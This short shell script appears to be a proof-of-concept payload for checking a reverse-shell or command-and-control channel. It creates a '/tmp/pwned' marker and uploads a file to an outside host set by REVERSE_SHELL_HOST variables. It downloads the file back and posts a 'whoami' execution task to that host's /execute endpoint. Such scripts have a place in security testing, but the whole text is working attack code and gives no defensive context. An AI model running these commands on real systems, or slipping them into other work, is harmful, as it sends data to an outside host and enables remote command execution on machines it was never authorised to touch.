touch /tmp/pwned
echo "${REVERSE_SHELL_HOST}:${REVERSE_SHELL_PORT}" > /tmp/host.txt
curl -qs -X POST -F "file=@/tmp/host.txt" "http://${REVERSE_SHELL_HOST}:${REVERSE_SHELL_PORT}/files/${SESSION_ID}/host.txt"
curl -qs -X GET "http://${REVERSE_SHELL_HOST}:${REVERSE_SHELL_PORT}/files/${SESSION_ID}/host.txt" -o /tmp/download.txt
curl -qs -X POST "http://${REVERSE_SHELL_HOST}:${REVERSE_SHELL_PORT}/execute" -H "Content-Type: application/json" -d "{\"session_id\": \"${SESSION_ID}\", \"task\": \"whoami\"}" -o /tmp/execute.txt
sleep 30